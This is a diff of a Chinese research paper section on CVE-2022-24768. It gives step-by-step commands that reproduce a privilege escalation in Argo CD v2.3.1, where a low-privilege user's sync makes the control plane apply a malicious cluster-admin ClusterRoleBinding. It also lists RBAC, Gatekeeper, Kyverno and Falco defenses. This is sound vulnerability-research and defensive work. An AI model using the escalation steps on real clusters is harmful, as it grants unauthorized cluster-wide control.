@@ -1,5 +1,5 @@
 ﻿
-\subsubsection{（1）漏洞复现}
+\subsubsection{漏洞复现}
 
 Argo CD 是 Kubernetes 生态中广泛使用的声明式 GitOps 持续交付工具。其典型部署形态是由 Argo CD 控制平面以相对高权限身份持续对齐 Git 仓库中的期望状态，即对集群资源拥有创建、更新与删除能力。该架构提升交付一致性的同时，也引入了新的安全风险：一旦普通用户能够影响 Argo CD 的控制决策，便可能借助控制平面权限放大自身权限边界。
 
@@ -16,9 +16,90 @@ Argo CD 是 Kubernetes 生态中广泛使用的声明式 GitOps 持续交付工�
 \end{enumerate}
 
 
-实验部署受影响版本 Argo CD v2.3.1，并配置 Kubernetes 测试集群，以低权用户 bob 身份接入；bob 仅在特定项目范围内持有 \texttt{sync} 与 \texttt{override} 权限，对集群级资源无直接写入能力。测试仓库 \url{https://github.com/Ivanbeethoven/bad_repo} 中含正常业务资源 \texttt{app.yaml} 与恶意 ClusterRoleBinding \texttt{hack-admin.yaml}，二者均处于 Argo CD 同步路径下。关键命令与清单见附录\ref{app:cve-2022-24768}。
+实验部署受影响版本 Argo CD v2.3.1，并配置 Kubernetes 测试集群，以低权用户 bob 身份接入；bob 仅在特定项目范围内持有 \texttt{sync} 与 \texttt{override} 权限，对集群级资源无直接写入能力。测试仓库 \url{https://github.com/Ivanbeethoven/bad_repo} 中含正常业务资源 \texttt{app.yaml} 与恶意 ClusterRoleBinding \texttt{hack-admin.yaml}，二者均处于 Argo CD 同步路径下。bob 账户触发 Application 同步后，Argo CD 控制平面将恶意 ClusterRoleBinding 一并应用至集群，以 \texttt{--as bob} 执行 \texttt{kubectl auth can-i '*' '*'} 返回 \texttt{yes}，低权身份提升至集群管理员级别，权限边界放大经实验证实。关键命令与清单如下。
 
-bob 账户触发 Application 同步后，Argo CD 控制平面将恶意 ClusterRoleBinding 一并应用至集群，以 \texttt{--as bob} 执行 \texttt{kubectl auth can-i '*' '*'} 返回 \texttt{yes}，低权身份提升至集群管理员级别，权限边界放大经实验证实。
+\textbf{步骤 1：部署漏洞版本 Argo CD（v2.3.1）}
+\begin{AppendixCode}
+kubectl create namespace argocd
+kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/v2.3.1/manifests/install.yaml
+kubectl rollout status deployment/argocd-server -n argocd
+\end{AppendixCode}
+
+\textbf{步骤 2：获取初始管理员密码并登录 UI/CLI}
+\begin{AppendixCode}
+kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 -d && echo
+kubectl port-forward svc/argocd-server -n argocd 8080:443
+\end{AppendixCode}
+
+\textbf{步骤 3：创建宽松的 AppProject（用于演示风险）}
+\begin{AppendixCode}
+cat <<EOF | kubectl apply -f -
+apiVersion: argoproj.io/v1alpha1
+kind: AppProject
+metadata:
+	name: demo-project
+	namespace: argocd
+spec:
+	destinations:
+	- namespace: '*'
+		server: '*'
+	sourceRepos:
+	- '*'
+	clusterResourceWhitelist:
+	- group: '*'
+		kind: '*'
+EOF
+\end{AppendixCode}
+
+\textbf{步骤 4：创建低权用户 bob，并授予其对目标 Application 的 \texttt{sync} 与 \texttt{override} 权限}
+\begin{AppendixCode}
+policy.default: role:readonly
+policy.csv: |
+	p, role:syncer, applications, sync, demo-project/*, allow
+	p, role:syncer, applications, override, demo-project/*, allow
+	g, bob, role:syncer
+\end{AppendixCode}
+\begin{AppendixCode}
+accounts.bob: apiKey, login
+\end{AppendixCode}
+\begin{AppendixCode}
+kubectl rollout restart deployment/argocd-server -n argocd
+\end{AppendixCode}
+
+\textbf{步骤 5：创建 Application 指向恶意仓库}
+\begin{AppendixCode}
+cat <<EOF | kubectl apply -f -
+apiVersion: argoproj.io/v1alpha1
+kind: Application
+metadata:
+	name: bob-app
+	namespace: argocd
+spec:
+	project: demo-project
+	source:
+		repoURL: https://github.com/Ivanbeethoven/bad_repo
+		path: .
+		targetRevision: HEAD
+	destination:
+		server: https://kubernetes.default.svc
+		namespace: default
+	syncPolicy:
+		automated:
+			prune: true
+			selfHeal: true
+EOF
+\end{AppendixCode}
+
+\textbf{步骤 6：模拟 bob 触发同步}
+\begin{AppendixCode}
+argocd login localhost:8080 --username bob --password <token-or-password>
+argocd app sync bob-app --force
+\end{AppendixCode}
+
+\textbf{步骤 7：验证权限提升}
+\begin{AppendixCode}
+kubectl auth can-i '*' '*' --as bob
+\end{AppendixCode}
 
 \begin{figure}[htb]
         \centering
@@ -34,9 +115,255 @@ bob 账户触发 Application 同步后，Argo CD 控制平面将恶意 ClusterRo
         \label{fig:cve-2022-24768-chain}
 \end{figure}
 
-\subsubsection{（2）安全策略生成}
+\subsubsection{安全策略生成}
 
-KPEDefense 针对该漏洞筛选出的最优策略以 RBAC 权限收敛与准入控制为核心，覆盖 Kubernetes 集群侧与 Argo CD 应用侧两个层面：在集群侧收紧低权限主体对高危资源绑定操作的访问，在应用侧限制 AppProject 写入，防止攻击者借助 \texttt{sync\allowbreak+\allowbreak override} 操作创建集群级高权限绑定。详细配置见附录\ref{app:cve-2022-24768}。
+该漏洞的攻击面横跨 Kubernetes 集群侧与 Argo CD 应用侧，KPEDefense 筛选出的最优策略对两个层面均做出覆盖。集群侧通过 RBAC 收敛限制低权主体对高危资源绑定操作的访问；应用侧通过 Gatekeeper 准入规则限制 AppProject 写入，阻止攻击者借助 \texttt{sync\allowbreak+\allowbreak override} 操作创建集群级高权限绑定。Falco 运行时规则作为补充检测层，对 \texttt{cluster-admin} 级别 ClusterRoleBinding 的创建行为产生实时告警。详细配置如下。
+
+\textbf{Kubernetes RBAC：收敛 AppProject 的写权限}
+\begin{AppendixCode}
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+	name: argocd-appproject-edit
+rules:
+- apiGroups: ["argoproj.io"]
+	resources: ["appprojects"]
+	verbs: ["get","list","watch","create","update","patch","delete"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+	name: argocd-appproject-readonly
+rules:
+- apiGroups: ["argoproj.io"]
+	resources: ["appprojects"]
+	verbs: ["get","list","watch"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+	name: argocd-appproject-edit-platform-admins
+roleRef:
+	apiGroup: rbac.authorization.k8s.io
+	kind: ClusterRole
+	name: argocd-appproject-edit
+subjects:
+- kind: Group
+	name: argo:platform-admin
+	apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+	name: argocd-appproject-readonly-tenants
+roleRef:
+	apiGroup: rbac.authorization.k8s.io
+	kind: ClusterRole
+	name: argocd-appproject-readonly
+subjects:
+- kind: Group
+	name: argo:tenant-readonly
+	apiGroup: rbac.authorization.k8s.io
+\end{AppendixCode}
+
+\textbf{Argo CD RBAC：默认只读 + 高风险能力隔离}
+\begin{AppendixCode}
+apiVersion: v1
+kind: ConfigMap
+metadata:
+	name: argocd-rbac-cm
+	namespace: argocd
+data:
+	policy.csv: |
+		g, argo:platform-admin, role:admin
+		g, argo:tenant-readonly, role:readonly
+
+		p, role:admin, projects, *, *, allow
+		p, role:admin, repositories, *, *, allow
+		p, role:admin, clusters, *, *, allow
+		p, role:admin, applications, *, *, allow
+		p, role:admin, exec, *, *, allow
+		p, role:admin, logs, *, *, allow
+
+		p, role:readonly, applications, get, *, allow
+		p, role:readonly, repositories, get, *, allow
+		p, role:readonly, projects, get, *, allow
+		p, role:readonly, clusters, get, *, allow
+		p, role:readonly, logs, get, *, allow
+		p, role:readonly, exec, *, *, deny
+	policy.default: role:readonly
+\end{AppendixCode}
+
+\textbf{准入控制：Gatekeeper（推荐）}\label{app:cve-2022-24768-gatekeeper}
+\begin{AppendixCode}
+apiVersion: templates.gatekeeper.sh/v1beta1
+kind: ConstraintTemplate
+metadata:
+	name: k8sargocdappprojectpolicies
+spec:
+	crd:
+		spec:
+			names:
+				kind: K8sArgoCDAppProjectPolicies
+			validation:
+				openAPIV3Schema:
+					properties:
+						enforceProjPrefix:
+							type: boolean
+	targets:
+	- target: admission.k8s.gatekeeper.sh
+		rego: |
+			package k8sargocdappprojectpolicies
+
+			trim_space(s) = out {
+				out := regex.replace("^\\s+|\\s+$", "", s)
+			}
+
+			# 1) 禁止出现 "..., *, *, allow" 的全局通配符放权
+			deny[msg] {
+				input.review.kind.group == "argoproj.io"
+				input.review.kind.kind == "AppProject"
+				roles := input.review.object.spec.roles
+				some i
+				policies := roles[i].policies
+				some j
+				policy := policies[j]
+				regex.match(".*,\\s*\\*,\\s*\\*,\\s*allow\\s*$", policy)
+				msg := sprintf("AppProject policy contains global wildcard allow: %s", [policy])
+			}
+
+			# 2) 要求 subject 采用 proj:<project>:<role> 前缀（可选开关）
+			deny[msg] {
+				input.review.kind.group == "argoproj.io"
+				input.review.kind.kind == "AppProject"
+				input.parameters.enforceProjPrefix == true
+				ap := input.review.object.metadata.name
+
+				roles := input.review.object.spec.roles
+				some i
+				policies := roles[i].policies
+				some j
+				policy := policies[j]
+
+				startswith(policy, "p,")
+				parts := split(policy, ",")
+				count(parts) >= 2
+				subject := trim_space(parts[1])
+				not startswith(subject, sprintf("proj:%s:", [ap]))
+				msg := sprintf("AppProject policy subject must start with 'proj:%s:': %s", [ap, policy])
+			}
+
+			# 3) 禁止授予 projects/repositories/clusters/exec 的写权限
+			deny[msg] {
+				input.review.kind.group == "argoproj.io"
+				input.review.kind.kind == "AppProject"
+				roles := input.review.object.spec.roles
+				some i
+				policies := roles[i].policies
+				some j
+				policy := policies[j]
+				regex.match("^p,.*,(projects|repositories|clusters|exec),\\s*(create|update|patch|delete|\\*),.*,(allow)\\s*$", policy)
+				msg := sprintf("AppProject policy grants write on global resource: %s", [policy])
+			}
+\end{AppendixCode}
+
+\textbf{Constraint}
+\begin{AppendixCode}
+apiVersion: constraints.gatekeeper.sh/v1beta1
+kind: K8sArgoCDAppProjectPolicies
+metadata:
+	name: restrict-argocd-appproject-policies
+spec:
+	match:
+		kinds:
+		- apiGroups: ["argoproj.io"]
+			kinds: ["AppProject"]
+	parameters:
+		enforceProjPrefix: true
+\end{AppendixCode}
+
+\textbf{准入控制：Kyverno（替代方案）}\label{app:cve-2022-24768-kyverno}
+\begin{AppendixCode}
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+	name: restrict-argocd-appproject-policies
+spec:
+	validationFailureAction: Audit
+	background: true
+	rules:
+	- name: forbid-global-wildcard-allow
+		match:
+			any:
+			- resources:
+					kinds:
+					- argoproj.io/v1alpha1/AppProject
+		validate:
+			message: "forbid global wildcard allow in AppProject role policies"
+			foreach:
+			- list: "request.object.spec.roles[].policies[]"
+				deny:
+					conditions:
+						any:
+						- key: "{{ regex_match('.*,\\s*\\*,\\s*\\*,\\s*allow\\s*$', element) }}"
+							operator: Equals
+							value: true
+
+	- name: enforce-proj-prefix
+		match:
+			any:
+			- resources:
+					kinds:
+					- argoproj.io/v1alpha1/AppProject
+		validate:
+			message: "policy subject must use proj:<project>:<role> prefix"
+			foreach:
+			- list: "request.object.spec.roles[].policies[]"
+				deny:
+					conditions:
+						all:
+						- key: "{{ regex_match('^p,\\s*proj:[^:]+:[^,]+,', element) }}"
+							operator: Equals
+							value: false
+
+	- name: forbid-global-resource-write
+		match:
+			any:
+			- resources:
+					kinds:
+					- argoproj.io/v1alpha1/AppProject
+		validate:
+			message: "forbid write on projects/repositories/clusters/exec in AppProject policies"
+			foreach:
+			- list: "request.object.spec.roles[].policies[]"
+				deny:
+					conditions:
+						any:
+						- key: "{{ regex_match('^p,.*,(projects|repositories|clusters|exec),\\s*(create|update|patch|delete|\\*),.*,(allow)\\s*$', element) }}"
+							operator: Equals
+							value: true
+\end{AppendixCode}
+
+\textbf{运行时检测：Falco 规则}
+\begin{AppendixCode}
+- rule: Detect ClusterRoleBinding to cluster-admin
+  desc: >
+    Detects creation of ClusterRoleBinding that references
+    cluster-admin ClusterRole, which may indicate
+    privilege escalation via Argo CD sync.
+  condition: >
+    kevt and kcreate and
+    ka.target.resource = "clusterrolebindings" and
+    ka.req.binding.role = "cluster-admin"
+  output: >
+    ClusterRoleBinding to cluster-admin created
+    (user=%ka.user.name resource=%ka.target.name
+    role=%ka.req.binding.role ns=%ka.target.namespace)
+  priority: CRITICAL
+  source: k8s_audit
+  tags: [k8s, privilege_escalation, cve-2022-24768]
+\end{AppendixCode}
+
 
 \subsubsection{（3）安全策略验证}
 
@@ -52,5 +379,3 @@ KPEDefense 针对该漏洞筛选出的最优策略以 RBAC 权限收敛与准入
 RBAC 策略与 Argo CD 配置均以 YAML 形式纳入 Git 基线，通过 \texttt{kubectl apply} 一步部署，实验集群中无冲突落地。Gatekeeper 规则可模板化复用于多集群场景。
 
 就 CVE-2022-24768 而言，KPEDefense 筛选的最优策略组合在三维验证中通过。Kubernetes RBAC 收敛与准入控制协同后，低权用户借助 \texttt{sync\allowbreak+\allowbreak override} 诱导控制平面创建集群级高权限绑定的路径被关闭。该方案可作为版本升级前的补充缓解措施，最终仍需升级至官方补丁版本 2.1.14、2.2.8 或 2.3.2。
-
-
